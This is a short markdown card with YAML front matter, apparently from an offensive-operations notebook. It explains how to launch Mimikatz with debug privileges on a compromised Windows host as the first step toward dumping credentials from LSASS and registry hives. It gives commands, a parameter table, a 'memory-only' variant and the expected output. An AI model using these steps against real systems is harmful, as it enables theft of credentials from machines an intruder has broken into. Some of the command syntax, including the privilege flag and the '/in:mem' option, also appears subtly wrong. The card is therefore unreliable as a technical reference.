---
type: command
executor: cmd
data: 'mimikatz.exe -privilege:debug'
output: Privilege '20' OK
created_at: '2023-04-06T03:56:27Z'
updated_at: '2023-04-10T20:37:16Z'
platforms:
  - Windows
tags:
  - mimikatz
  - privilege-escalation
verified: true
validated: true
---

# mimikatz-launch-elevated

## Command

```cmd
mimikatz.exe -privilege:debug
```

## Description

Launches Mimikatz with debug privileges to enable access to protected system resources like LSASS and registry hives. Use this as the initial step on a compromised Windows host to prepare for credential dumping.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-privilege:debug` | Requests SeDebugPrivilege (20) for memory reading and injection | Yes |
| `mimikatz.exe` | Path to the Mimikatz executable (place in working directory) | Yes |

## Examples

### Basic Usage

```cmd
mimikatz.exe -privilege:debug
```

### Advanced Usage (Memory-Only)

```cmd
mimikatz.exe /in:mem
```

## Expected Output

Privilege '20' OK

Error code: 0x0 (success). If failed, output shows insufficient privileges; relaunch as admin.

## Related

- [[procedures/Credential-Harvesting-from-Task-Scheduler-using-Mimikatz]]
- [[tools/Mimikatz]]
